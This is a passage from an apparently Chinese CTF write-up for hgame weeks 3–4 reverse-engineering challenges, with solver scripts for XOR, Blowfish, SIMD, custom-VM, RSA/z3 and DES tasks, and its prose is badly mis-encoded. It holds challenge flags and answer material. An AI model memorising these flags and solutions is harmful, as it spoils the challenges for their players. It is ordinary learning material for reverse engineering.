18295033054788808618, 18126228466291248047, 9413762634844369954 , 8964324149921197550 , 6962485320551449848 ] from libnum import n2s for i in range(len(xs)): y = decrypt(xs[i], ks[i]) print (n2s(y).decode(), end=\u0026#39;\u0026#39;) # hgame{XOr|RoR\u0026amp;rOl|Is+vERY#coMmon*BiTwisE$OPeraTiOn*IT@is%oFten,ENCOUntErED*in.syMMeTRic?encryPtION} æ®è¯´è¿™ä¸ªåŠ å¯†æ–¹æ³•å’Œæ±‚é€†å¤šé¡¹å¼è¿˜æœ‰å…³ç³»ï¼Œå¾ˆç¥å¥‡\nWeek3 [RE]Answer\u0026rsquo;s windows ä½¿ç”¨ right.png å­—ç¬¦ä¸²èƒ½å¤Ÿå®šä½åˆ°éªŒè¯å‡½æ•°\nåŠ¨è°ƒå‘ç°ä½¿ç”¨äº† string çš„å­˜å‚¨æ–¹å¼ï¼ˆå¥½åƒå°±æ˜¯æŠŠ string å†…è”äº†ï¼‰ï¼Œåªä½¿ç”¨äº† Base64 ç¼–ç \nä½† base è¡¨å’Œç›®æ ‡å¯¹åº”ä¸ä¸Šï¼Œæ˜¾ç„¶æ˜¯æœ‰åè°ƒè¯•ï¼Œè‡ªå·±åšçš„æ—¶å€™ç›´æ¥çŒœåˆ°äº†çœŸå®è¡¨æ˜¯ ascii çš„å‰ 64 ä¸ªå¯è§å­—ç¬¦\næˆ–è€…æ ¹æ®äº¤å‰å¼•ç”¨æ‰¾åˆ° debugï¼ŒæŠŠåè°ƒè¯•åˆ¤æ–­ nop æ‰å†åŠ¨è°ƒå³å¯\n[RE]creakme_3 PPC æ¶æ„ï¼Œç”¨ ghidra çœ‹çš„\nundefined4 main(void) { int fs; int randnum; int j; int order_cnt; int i; int order [89]; int canary; canary = *(int *)(fs + -0x7008); memset(order,0,0x164); printf(\u0026#34;Welcome my whitegive re task! This is your flag: \u0026#34;); do { for (j = 0; j \u0026lt; 0x59; j = j + 1) { randnum = rand(); order[j] = randnum % 0x59; } order_cnt = 1; while ((order_cnt \u0026lt; 0x59 \u0026amp;\u0026amp; (a[order[order_cnt + -1] * 2 + 1] \u0026lt;= a[order[order_cnt] * 2 + 1]))) { order_cnt = order_cnt + 1; } } while (order_cnt != 0x59); for (i = 0; i \u0026lt; 0x59; i = i + 1) { putchar(a[order[i] * 2]); } if (canary == *(int *)(fs + -0x7008)) { return 0; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } æ‰‹åŠ¨æ¢å¤äº†ä¸€ä¸‹ç¬¦å·ï¼Œç®€å•çš„è¯´å°±æ˜¯åªæœ‰æ»¡è¶³é¡ºåºéƒ½æ˜¯ \u0026lt;= çš„æ—¶å€™æ‰èƒ½é€€å‡ºç¬¬ä¸€ä¸ªå¾ªç¯ï¼Œæ‰€ä»¥ rand() åªæ˜¯ä¸ªå¿½æ‚ äººå¹¶ä¸”æµªè´¹æ—¶é—´çš„ä¸œè¥¿ï¼ˆåæ¥çŸ¥é“è¿™ä¸ªä¸œè¥¿å«çŒ´å­åŠ å¯†ï¼‰\næ‰€ä»¥æå–ä¸€ä¸‹æ•°å­—ç„¶åæ’åºå°±è¡Œ\na = [ (0x30, 0x4E7D), (0x30, 0x67BD), (0x30, 0x7A48), (0x30, 0x82A2), (0x30, 0x933E), (0x31, 0x9C18), (0x32, 0x5AFF), (0x32, 0x6CD7), (0x32, 0xA6CA), (0x32, 0xBD79), (0x32, 0xCEBD), (0x33, 0x324A), (0x33, 0x3292), (0x33, 0x3905), (0x33, 0x4291), (0x33, 0x5ADE), (0x33, 0x6E9F), (0x33, 0xA52A), (0x33, 0xBE35), (0x33, 0xCB63), (0x35, 0x7F3B), (0x38, 0x3914), (0x38, 0xB2AD), (0x39, 0x38DA), (0x39, 0x4E50), (0x39, 0x6A02), (0x39, 0xB10F), (0x42, 0x78E5), (0x5F, 0x7EF6), (0x5F, 0x89A3), (0x5F, 0x8EBD), (0x5F, 0x95E3), (0x61, 0x73DA), (0x64, 0x538C), (0x64, 0x633B), (0x64, 0x9E9C), (0x64, 0xB78B), (0x64, 0xC866), (0x65, 0x32AE), (0x65, 0x7679), (0x66, 0x2AE7), (0x66, 0x4D6A), (0x66, 0x5708), (0x66, 0x6610), (0x66, 0xA258), (0x66, 0xB80C), (0x66, 0xC885), (0x67, 0x710A), (0x67, 0x7CF4), (0x68, 0x3F76), (0x68, 0x702B), (0x68, 0xA3EE), (0x68, 0xAD50), (0x68, 0xBAC7), (0x69, 0x4024), (0x69, 0x8A22), (0x69, 0xC055), (0x6A, 0x2B52), (0x6A, 0xC687), (0x6B, 0x5F00), (0x6B, 0xC417), (0x6C, 0x6182), (0x6D, 0x75DB), (0x6E, 0x3C61), (0x6E, 0x4996), (0x6E, 0x5DC1), (0x6F, 0x2D76), (0x6F, 0x7D17), (0x6F, 0xA91B), (0x70, 0x9AED), (0x72, 0x45D0), (0x72, 0x8467), (0x72, 0xAB5D), (0x73, 0x5083), (0x73, 0x6222), (0x73, 0x8D93), (0x73, 0x923A), (0x73, 0x971E), (0x73, 0xB4BA), (0x73, 0xC785), (0x74, 0x3558), (0x74, 0x86BD), (0x74, 0x9738), (0x75, 0x3710), (0x75, 0x9779), (0x77, 0x2F3F), (0x77, 0x44DD), (0x7B, 0x78E1), (0x7D, 0x9F42) ] def takeSecond(elem): return elem[1] a.sort(key=takeSecond) for i in a: print (chr(i[0]), end=\u0026#39;\u0026#39;) # fjow33etu938nhi3wrnf90sdf32nklsdf0923hgame{B0go_50rt_is_s0_stup1d}fh32orh98sdfh23ikjsdf32 [RE]fishman pydé€†å‘\nå®šä½å‡½æ•° æœç´¢å­—ç¬¦ä¸²ï¼Œèƒ½çœ‹åˆ°å‡ ä¸ªå‡½æ•°å\næ¯”å¦‚ init å‡½æ•°å°±æ˜¯ sub_180002670\nå¯†ç ç®—æ³•è¯†åˆ«+æ±‚è§£ æŸ¥çœ‹ä¸€ä¸‹ init å’Œ check å‡½æ•°ï¼Œè¿™é¢˜ä½¿ç”¨çš„æ˜¯ blowfish å¯†ç ï¼Œä¹‹å‰æ²¡æœ‰é‡åˆ°è¿‡ï¼Œæ‰€ä»¥æ˜¯é ç€ findcrypt è„šæœ¬è¯†åˆ«å‡ºæ¥çš„\né¡ºä¾¿æ”¾ä¸€ä¸‹æœåˆ°çš„åŠ å¯†ç®—æ³•æºç ï¼Œæ¥æºæ˜¯ https://gitee.com/miao123456miao/blowfish2ï¼ˆgithub è¿ä¸ä¸Šï¼Œå‘œå‘œå‘œï¼‰\nè¿™æ˜¯ä¸€ä¸ªåˆ†ç»„å¯†ç ï¼Œä¸»è¦çš„ç‰¹å¾å°±æ˜¯ f å‡½æ•°\nå‰©ä¸‹çš„ä¹Ÿæ²¡ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œè´´ä¸€ä¸‹æ±‚è§£è„šæœ¬å§\nddl å¸ˆå‚…å‘ç°è¿™ä¸ªåœ¨ kali ä¸Šç¼–è¯‘åä¼šå‡ºç°ä¹±ç ï¼Œä¸»è¦åŸå› åœ¨äº kali ä¸Šç¼–è¯‘åä¼šæŠŠ low æ”¾åœ¨ä½åœ°å€è€Œ Ubuntu ä¼šæ”¾åœ¨é«˜åœ°å€ï¼Œæ‰€ä»¥ç›´æ¥ write(1, \u0026amp;high, 8) å°±æ— æ³•æ‰“å°åˆ° lowï¼Œä¿®æ”¹ä¸º write(1, \u0026amp;high, 4); write(1, \u0026amp;low, 4); å°±èƒ½è§£å†³è¿™ä¸ªé—®é¢˜ã€‚\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026#34;blowfish.h\u0026#34; void swap(uint32_t* a, uint32_t* b) { uint32_t tmp; tmp = *a; *a = *b; *b = tmp; } uint32_t blowfish_f(blowfish_t* container, uint32_t input) { uint8_t a, b, c, d; a = input \u0026gt;\u0026gt; 24; b = (input \u0026gt;\u0026gt; 16) \u0026amp; 0xff; c = (input \u0026gt;\u0026gt; 8) \u0026amp; 0xff; d = input \u0026amp; 0xff; return ((container-\u0026gt;s[0][a] + container-\u0026gt;s[1][b]) ^ container-\u0026gt;s[2][c]) + container-\u0026gt;s[3][d]; } void blowfish_cipher(blowfish_t* container, uint32_t* xl, uint32_t* xr, uint8_t mode) { int i; uint32_t loc_xl, loc_xr; loc_xl = *xl; loc_xr = *xr; if(mode == BLOWFISH_ENCRYPT) { for(i = 0; i \u0026lt; PASSES; i++) { loc_xl = loc_xl ^ container-\u0026gt;p[i]; loc_xr = blowfish_f(container, loc_xl) ^ loc_xr; swap(\u0026amp;loc_xl, \u0026amp;loc_xr); } } else if(mode == BLOWFISH_DECRYPT) { for(i = PASSES+1; i \u0026gt; 1; i--) { loc_xl = loc_xl ^ container-\u0026gt;p[i]; loc_xr = blowfish_f(container, loc_xl) ^ loc_xr; swap(\u0026amp;loc_xl, \u0026amp;loc_xr); } } swap(\u0026amp;loc_xl, \u0026amp;loc_xr); if(mode == BLOWFISH_ENCRYPT) { loc_xr = loc_xr ^ container-\u0026gt;p[PASSES]; loc_xl = loc_xl ^ container-\u0026gt;p[PASSES+1]; } else if(mode == BLOWFISH_DECRYPT) { loc_xr = loc_xr ^ container-\u0026gt;p[1]; loc_xl = loc_xl ^ container-\u0026gt;p[0]; } *xl = loc_xl; *xr = loc_xr; } blowfish_t* blowfish_initialize(unsigned char* key, uint32_t length) { blowfish_t* container = malloc(sizeof(blowfish_t)); unsigned int i, ii, j = 0; uint32_t tmp, tmp_l = 0, tmp_r = 0; if(length \u0026gt; BLOWFISH_MAX_KEY_BYTES) return (blowfish_t*) NULL; for(i = 0; i \u0026lt; PASSES+2; i++) { container-\u0026gt;p[i] = P[i]; } for(i = 0; i \u0026lt; SBOXES; i++) { for(ii = 0; ii \u0026lt; 256; ii++) { container-\u0026gt;s[i][ii] = S[i][ii]; } } for(i = 0; i \u0026lt; PASSES+2; i++) { tmp = 0; for(ii = 0; ii \u0026lt; 4; ii++) { tmp = (tmp \u0026lt;\u0026lt; 8) | key[j]; j++; if(j == length) j = 0; } container-\u0026gt;p[i] = container-\u0026gt;p[i] ^ tmp; } for(i = 0; i \u0026lt; PASSES+1; i += 2) { blowfish_cipher(container, \u0026amp;tmp_l, \u0026amp;tmp_r, BLOWFISH_ENCRYPT); container-\u0026gt;p[i] = tmp_l; container-\u0026gt;p[i+1] = tmp_r; } for(i = 0; i \u0026lt; SBOXES; i++) { for(ii = 0; ii \u0026lt; 256; ii += 2) { blowfish_cipher(container, \u0026amp;tmp_l, \u0026amp;tmp_r, BLOWFISH_ENCRYPT); container-\u0026gt;s[i][ii] = tmp_l; container-\u0026gt;s[i][ii+1] = tmp_r; } } } int main(int argc, char** argv) { uint32_t high, low; blowfish_t* container = blowfish_initialize(\u0026#34;LET_U_D\u0026#34;, 7); high = 1416580799u; low = 3035468667u; blowfish_cipher(container, \u0026amp;high, \u0026amp;low, BLOWFISH_DECRYPT); // write(1, \u0026amp;high, 8); write(1, \u0026amp;high, 4); write(1, \u0026amp;low, 4); high = 2194841726u; low = 332656605u; blowfish_cipher(container, \u0026amp;high, \u0026amp;low, BLOWFISH_DECRYPT); // write(1, \u0026amp;high, 8); write(1, \u0026amp;high, 4); write(1, \u0026amp;low, 4); high = 571059727u; low = 1498341217u; blowfish_cipher(container, \u0026amp;high, \u0026amp;low, BLOWFISH_DECRYPT); // write(1, \u0026amp;high, 8); write(1, \u0026amp;high, 4); write(1, \u0026amp;low, 4); high = 3107158060u; low = 470279474u; blowfish_cipher(container, \u0026amp;high, \u0026amp;low, BLOWFISH_DECRYPT); // write(1, \u0026amp;high, 8); write(1, \u0026amp;high, 4); write(1, \u0026amp;low, 4); return 0; } blowfish.h å»ä»“åº“æ‰¾å°±è¡Œ\nè¯•äº†ä¸€ä¸‹ pycrypto åº“ï¼Œè§£å‡ºæ¥çš„æœ‰é—®é¢˜ï¼Œå¯èƒ½åº“çš„å®ç°å’Œè¿™ä¸ªæœ‰åŒºåˆ«ï¼Œæ²¡æ·±å…¥ç ”ç©¶\nweek4 [RE]hardasm å…¨æ˜¯ simdï¼Œåç€æ‰§è¡Œå›å»å°±è¡Œï¼Œæˆ–è€…å¯ä»¥è¯•è¯•æ­£ç€ç”¨ z3 è§£\nè¿™ä¸ªè„šæœ¬å› ä¸ºæœ‰äº›æŒ‡ä»¤çš„æŸä¸€ä¸ªå‚æ•°æ˜¯ä¸å˜çš„ï¼ˆæ¯”å¦‚ vpermd ymmX, ymm7, ymmXï¼‰ï¼Œæ‰€ä»¥å·æ‡’äº†\nasm = \u0026#39;\u0026#39;\u0026#39;\\ vpermd ymm4, ymm7, ymm4 ... vpermd ymm1, ymm7, ymm1\u0026#39;\u0026#39;\u0026#39; ymm0 = b\u0026#39;\\x93\\xcb\\xe7\\x93\\xa9\\x81\\r\\xb6\\xd8\\xdd\\x9c\\x7f\\xc0M\\xcd\\xf0\\x00\\xa0\\x9f\u0026#34;\\x89\\xefT]\\xef\\x00\\x8d\\xfe^L\\xd0\\xec\u0026#39; ymm1 = b\u0026#39;i\\xcf\\x8e\\xb3\\xf8\\x98\\x90\\x0b\\\\\u0026amp;}\\xcf\\x8c$\\x1d\\x96s\\x8b\\xc7\\xaa\\xfc\\xaf\\xfd\\x91F3e\\xb8#z\\xcd\\xa5\u0026#39; ymm2 = b\u0026#34;\\xff\\x83\\xf3\\xdf\\xec\\x00\\x8e\\x92OL\\x97O\u0026#39;D\\x7f\\xa4\\xe3N\\xbf$d\\xdd*T\\xc3i\\xb2\\x82q\\xa0\\x1b\\xf5\u0026#34; ymm3 = b\u0026#39;\\xb4\\xc7lj\\xfb\\x1fp\\xf5}\\xc9\\r\\x1b\\xb4\\xe5\\xffEN^\\x95]\\xef\\x8e@\\x8d\\x9a\\xf9\\xd1\\x92\\x8b\\xbf}\\xbb\u0026#39; ymm4 = b\u0026#39;\\xca}6\\xf7\\xc5\\xcb\\x90\\xb9B\\x96\\xe0\\xa55sL\\xf7\\xa9\\x9d\\x87\\xa1\\xc2r\\x8b\\xe8\\x9af\\t*\\xe6%\\x04\\xd1\u0026#39; ymm5 = b\u0026#39;)\\x9d\\x0bGy\\x1a\\xa4\\x97\\x02\\xbf\\x13\\x9e\\xa0\\xd2\\xa4m?_=M4\\xea\\xeeRa\\x97e\\xb4\\x04\\x91\\xd8W\u0026#39; ymm6 = b\u0026#39;\\x00\\x01\\x08\\t\\n\\x02\\x03\\x04\\x05\\x0c\\r\\x0e\\x06\\x07\\x0b\\x0f\\x00\\x06\\x07\\x08\\t\\n\\x02\\x03\\x04\\x05\\r\\x0e\\x0b\\x0c\\x01\\x0f\u0026#39; ymm7 = b\u0026#39;\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x07\\x00\\x00\\x00\u0026#39; def rev_vpermd(x, y): \u0026#34;\u0026#34;\u0026#34; origin: from: b\u0026#34;3_bh\u0026#34; b\u0026#34;\\rd\\xa8\\xff\\x8f\\x99\\xa7\\x94\\x9e\\x9a)4\u0026#34; b\u0026#34;\u0026#39;6\\xd6\\x82\\xc2m\\xe8\\xaa\u0026#34; b\u0026#34;\\x96Je\\xc0\\x0c7\\x19\\xc9\u0026#34; to : b\u0026#34;3_bh\u0026#34; b\u0026#34;\u0026#39;6\\xd6\\x82\\xc2m\\xe8\\xaa\u0026#34; b\u0026#34;\\rd\\xa8\\xff\\x8f\\x99\\xa7\\x94\\x9e\\x9a)4\u0026#34; b\u0026#34;\\x96Je\\xc0\\x0c7\\x19\\xc9\u0026#34; \u0026#34;\u0026#34;\u0026#34; return y[:4] + y[12:24] + y[4:12] + y[24:] def rev_vpxor(x, y): return bytes([a ^ b for a, b in zip(x, y)]) def rev_vpaddb(x, y): return bytes([(a - b) \u0026amp; 0xff for a, b in zip(x, y)]) def rev_vpsubb(x, y): return bytes([(a + b) \u0026amp; 0xff for a, b in zip(x, y)]) def rev_vpshufb(x, y): \u0026#34;\u0026#34;\u0026#34; origin: from: b\u0026#39;\\x89\\xa1\u0026#39; b\u0026#39;\u0026gt;\\xc0\\xe5\\x14\u0026#39; \u0026#39;_\\xc5\u0026#39; \u0026#39;_\\x14\\xb0\u0026#39; \u0026#39;\\xd0\u0026#39; \u0026#39;%\\x1f\\xe8\u0026#39; \u0026#39;\\xf5\\xb0\u0026#39; \u0026#39;4\u0026#39; \u0026#39;6\\xc2\\xc7\\xa0\u0026#39; \u0026#39;\\xb2\u0026lt;^~\\x9c\u0026#39; \u0026#39;\\xa4\\x98\u0026#39; \u0026#39;\\xe8T\u0026#39; \u0026#39;\\x0b\u0026#39; to : b\u0026#39;\\x89\\xa1\u0026#39; b\u0026#39;_\\x14\\xb0\u0026#39; \u0026#39;\u0026gt;\\xc0\\xe5\\x14\u0026#39; \u0026#39;%\\x1f\\xe8\u0026#39; \u0026#39;_\\xc5\u0026#39; \u0026#39;\\xd0\u0026#39; \u0026#39;\\xf5\\xb0\u0026#39; \u0026#39;\\xb2\u0026lt;^~\\x9c\u0026#39; \u0026#39;6\\xc2\\xc7\\xa0\u0026#39; \u0026#39;\\xe8T\u0026#39; \u0026#39;\\xa4\\x98\u0026#39; \u0026#39;4\u0026#39; \u0026#39;\\x0b\u0026#39; \u0026#34;\u0026#34;\u0026#34; return x[:2] + x[5:9] + x[12:14] + x[2:5] + x[14:15] + x[9:12] + x[15:17]+ x[30:31] + x[22:26] + x[17:22] + x[28:30] + x[26:28] + x[31:] for a in asm.split(\u0026#39;\\n\u0026#39;)[::-1]: b = a.replace(\u0026#39;,\u0026#39;, \u0026#39;\u0026#39;).split() exec(f\u0026#39;{b[1]} = rev_{b[0]}({b[2]}, {b[3]})\u0026#39;) print (ymm0) ida åŠ¨è°ƒçš„æ—¶å€™è¦çŸ¥é“å¯„å­˜å™¨çš„å€¼ï¼Œå¯ä»¥ç”¨ idapython çš„ get_reg_value(\u0026quot;ymm0\u0026quot;) æŒ‡ä»¤ä¸çŸ¥é“ä»€ä¹ˆæ„æ€çš„è¯åŠ¨è°ƒçœ‹ä¸€ä¸‹å˜åŒ–å°±è¡Œ\n[RE]ezvm æŠŠå‡ ä¸ªæŒ‡ä»¤æ•´ç†ä¸€ä¸‹\nèƒ½å¤Ÿçœ‹å‡ºç‰¹å®šç”¨é€”çš„å‡ ä¸ªå¯„å­˜å™¨ï¼š\n[8]: ZF ç›¸ç­‰ä¸º 0ï¼Œå¤§äºä¸º 1ï¼Œå°äºä¸º -1 [9]: stack [9 + 100]: code [9 + 200]: data\nå…¶ä»–çš„åº”è¯¥éƒ½æ˜¯ rax ä¹‹ç±»çš„\næ€»ç»“çš„å‡ ä¸ªæŒ‡ä»¤ï¼š\nop disasm 0 mov r3, r2 1 inc r2 2 dec r2 3 xor r3, r7 4 push r3 5 push r5 6 push r6 7 pop r3 8 pop r5 9 pop r6 10 pop r2 11 pop r7 12 jz $+1+r6 13 jnz $+1+r6 14 jmp $+1+r2 15 cmp r3, r5 16 getchar(r3) 17 putchar(r3) 18 push *((r4++)+0xD1) 19 mov r3, [rbp+r2] 20 mov [rbp+r2], r3 21 add r3, r3 æ¥ä¸‹æ¥å°±æ˜¯åæ±‡ç¼–äº†\ncode = [ 0x12, 8, 0x12, 9, 0x10, 4, 1, 0x0F, 0x0D, 2, 0x12, 8, 0x12, 9, 0, 4, 0x0F, 0x0D, 0x12, 9, 0x12, 0x0A, 0x13, 0x12, 0x0B, 0x15, 3, 0x14, 1, 0, 0x0F, 0x0D, 0x12, 0x0A, 0x12, 0x12, 0x12, 8, 0x13, 0x0F, 7, 4, 9, 0x0D, 9, 8, 5, 6, 4, 1, 0, 0x0F, 0x0D, 0x12, 9, 0x12, 8, 0x12, 0x0A, 0x12, 7, 0x0F, 0x0C, 0x11, 0x0E ] def disasm(i, c): if c == 0: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;mov [3], [2]\u0026#34;) elif c == 1: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;inc [2]\u0026#34;) elif c == 2: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;dec [2]\u0026#34;) elif c == 3: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;xor [3], [7]\u0026#34;) elif c == 4: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;push [3]\u0026#34;) elif c == 5: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;push [5]\u0026#34;) elif c == 6: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;push [6]\u0026#34;) elif c == 7: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;pop [3]\u0026#34;) elif c == 8: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;pop [5]\u0026#34;) elif c == 9: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;pop [6]\u0026#34;) elif c == 10: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;pop [2]\u0026#34;) elif c == 11: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;pop [7]\u0026#34;) elif c == 12: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;jz $+1+[6]\u0026#34;) elif c == 13: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;jnz $+1+[6]\u0026#34;) elif c == 14: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;jmp $+1+[2]\u0026#34;) elif c == 15: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;cmp [3], [5]\u0026#34;) elif c == 16: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;getchar([3])\u0026#34;) elif c == 17: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;putchar([3])\u0026#34;) elif c == 18: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;push *(([4]++)+0xD1)\u0026#34;) elif c == 19: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;mov [3], [rbp+[2]]\u0026#34;) elif c == 20: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;mov [rbp+[2]], [3]\u0026#34;) elif c == 21: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;add [3], [3]\u0026#34;) ä¹Ÿè®¸è·Ÿç€ log ä¸€èµ·çœ‹æ¯”è¾ƒå¥½ï¼Œè¿™é‡Œå°±ç›´æ¥å¯¹ç€ data é‡Œçš„æ•°æ®çœ‹äº†\n_00: push 0x0A _01: pop [5] _02: push -5 _03: pop [6] _04: getchar([3]) _05: push [3] _06: inc [2] _07: cmp [3], [5] _08: jnz $+1+[6] _09: dec [2] è¿™ä¸ª jnz çš„å¾ªç¯æ˜¯ getchar() ç›´åˆ°è¯»å–åˆ° \\n\næ¥ä¸‹æ¥æ˜¯ä¸ªå¯¹é•¿åº¦åšäº†é™åˆ¶\n_0A: push 0x20 _0B: pop [5] _0C: push 0x2F _0D: pop [6] _0E: mov [3], [2] _0F: push [3] _10: cmp [3], [5] _11: jnz $+1+[6] è¿™é‡Œå…ˆ add è‡ªèº«ï¼Œç„¶åä¾æ¬¡å¼‚æˆ– data ä¸­çš„æ•°æ®ï¼ˆç¬¬ä¸€ä¸ªæ˜¯ 0x5eï¼‰\n_12: push -10 _13: pop [6] _14: push 0 _15: pop [2] _16: mov [3], [rbp+[2]] _17: push 0x5e (next_mem) _18: pop [7] _19: add [3], [3] _1A: xor [3], [7] _1B: mov [rbp+[2]], [3] _1C: inc [2] _1D: mov [3], [2] _1E: cmp [3], [5] _1F: jnz $+1+[6] åé¢å°±æ˜¯æ¯”è¾ƒäº†ï¼Œå¦‚æœä¸ç›¸ç­‰å°±ä¼šç›´æ¥ä»ç¬¬ä¸€ä¸ª jnz ç›´æ¥é€€å‡ºï¼Œå¦åˆ™ä¼šåˆ¤æ–­é•¿åº¦æ¥çœ‹æ˜¯å¦é€€å‡ºå¾ªç¯\n_20: push *(([4]++)+0xD1) ; 0 _21: pop [2] _22: push *(([4]++)+0xD1) ; -17 _23: push *(([4]++)+0xD1) ; 21 _24: push *(([4]++)+0xD1) ; 142 _25: pop [5] ; [5] = 142 _26: mov [3], [rbp+[2]] ; [3]=142 _27: cmp [3], [5] ; 0 _28: pop [3] _29: push [3] _2A: pop [6] ; 21 _2B: jnz $+1+[6] _2C: pop [6] ; -17 _2D: pop [5] _2E: push [5] _2F: push [6] _30: push [3] _31: inc [2] _32: mov [3], [2] _33: cmp [3], [5] _34: jnz $+1+[6] æœ€åä¸€æ®µæ²¡æœ‰çœ‹äº†ï¼Œputchar() æ˜¾ç„¶æ˜¯è¾“å‡ºæ­£ç¡®ä¿¡æ¯\nè„šæœ¬\nfrom operator import xor xor_list = [0x5E, 0x46, 0x61, 0x43, 0x0E, 0x53, 0x49, 0x1F, 0x51, 0x5E, 0x36, 0x37, 0x29, 0x41, 0x63, 0x3B, 0x64, 0x3B, 0x15, 0x18, 0x5B, 0x3E, 0x22, 0x50, 0x46, 0x5E, 0x35, 0x4E, 0x43, 0x23, 0x60, 0x3B] cipher = [0x8E, 0x88, 0x0A3, 0x99, 0x0C4, 0x0A5, 0x0C3, 0x0DD, 0x19, 0x0EC, 0x6C, 0x9B, 0x0F3, 0x1B, 0x8B, 0x5B, 0x3E, 0x9B, 0x0F1, 0x86, 0x0F3, 0x0F4, 0x0A4, 0x0F8, 0x0F8, 0x98, 0x0AB, 0x86, 0x89, 0x61, 0x22, 0xC1] for x, c in zip(xor_list, cipher): print (chr((c ^ x) // 2), end=\u0026#39;\u0026#39;) # hgame{Ea$Y-Vm-t0-PrOTeCT_cOde!!} [RE]server ä¸‹æ–­ç‚¹ï¼Œæµè§ˆå™¨è¾“å…¥ localhost:9090?flag=hgame{} å°±èƒ½æ–­ä½ï¼Œç„¶åå°±æ˜¯æ…¢æ…¢è°ƒè¯•äº†\nrsa éƒ¨åˆ†ç”¨çš„ math/big åº“ä¸­çš„ä¸œè¥¿ï¼Œè¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“è¯†åˆ«çš„ï¼ˆgo è¿˜æ˜¯çœ‹æ±‡ç¼–èˆ’æœï¼‰\néšåå°±æ˜¯ä¸¤ä¸ªå¾ªç¯çš„å¼‚æˆ–äº†ï¼Œè¿™é‡Œç”¨ z3 è§£çš„ï¼Œæ‰€ä»¥é€»è¾‘ç›´æ¥çœ‹ä»£ç å°±è¡Œ\nfrom libnum import * from z3 import * flag = [BitVec(\u0026#39;f%i\u0026#39; % i, 8) for i in range(153)] s = Solver() c = 0x66 flag2 = [] for i in range(153): v16 = flag[i] flag2.append(v16 ^ c) c = v16 for i in range(153): v18 = flag2[i] flag2[i] = v18 ^ c c = v18 cipher = [ 99, 85, 4, 3, 5, 5, 5, 3, 7, 7, 2, 8, 8, 11, 1, 2, 10, 4, 2, 13, 8, 9, 12, 9, 4, 13, 8, 0, 14, 0, 15, 13, 14, 10, 2, 2, 1, 7, 3, 5, 6, 4, 6, 7, 6, 2, 2, 5, 3, 3, 9, 6, 0, 11, 13, 11, 0, 2, 3, 8, 3, 11, 7, 1, 11, 5, 14, 5, 0, 10, 14, 15, 13, 7, 13, 7, 14, 1, 15, 1, 11, 5, 6, 2, 12, 6, 10, 4, 1, 7, 4, 2, 6, 3, 6, 12, 5, 12, 3, 12, 6, 0, 4, 15, 2, 14, 7, 0, 14, 14, 12, 4, 3, 4, 2, 0, 0, 2, 6, 2, 3, 6, 4, 4, 4, 7, 1, 2, 3, 9, 2, 12, 8, 1, 12, 3, 12, 2, 0, 3, 14, 3, 14, 12, 9, 1, 7, 15, 5, 7, 2, 2, 4 ] for i in range(153): s.add(flag2[i] == cipher[i]) for i in range(153): s.add(flag[i] \u0026gt;= ord(\u0026#39;0\u0026#39;)) s.add(flag[i] \u0026lt;= ord(\u0026#39;9\u0026#39;)) s.check() m = s.model() for i in flag: print (chr(m[i].as_long()), end=\u0026#39;\u0026#39;) # 135005562109829034199059149474896341566307600227148289525068532297727897409776873250963225670468340868270979975367474527115512003915945795967599087720024 M = 92582184765240663364795767694262273105045150785272129481762171937885924776597 N = 107310528658039985708896636559112400334262005367649176746429531274300859498993 t = M * N e = 950501 phi = (M - 1) * (N - 1) n2s(pow(135005562109829034199059149474896341566307600227148289525068532297727897409776873250963225670468340868270979975367474527115512003915945795967599087720024, invmod(e, phi), t)) # b\u0026#39;hgame{g0_and_g0_http_5erv3r_nb}\u0026#39; [RE]WOW è¿™é¢˜å‡ ä¹å’Œå¤©å ‚ä¹‹é—¨æ²¡å…³ç³»ï¼Œä¸»è¦æ˜¯æŠŠå¯†é’¥éšè—äº†ï¼Œè¿ç®—ä¹‹ååº”è¯¥æ˜¯ 12345678ï¼Œä½†ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ windbg åŠ¨è°ƒæ‹¿åˆ°è½®å¯†é’¥\né€šè¿‡ç½®æ¢å‡½æ•°+æ˜æ˜¾çš„å¸¸æ•°ç‰¹å¾åˆ¤æ–­æ˜¯ DESï¼Œç›´æ¥è§£å¯†å°±è¡Œ\nç½‘ä¸ŠæŠ„äº†ä»½ DESï¼Œæ”¹ä¸€æ”¹å°±è¡Œ\nsolve.c\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026#34;bool.h\u0026#34; #include \u0026#34;tables.h\u0026#34; void BitsCopy(bool *DatOut,bool *DatIn,int Len); void ByteToBit(bool *DatOut,char *DatIn,int Num); void BitToByte(char *DatOut,bool *DatIn,int Num); void BitToHex(char *DatOut,bool *DatIn,int Num); void HexToBit(bool *DatOut,char *DatIn,int 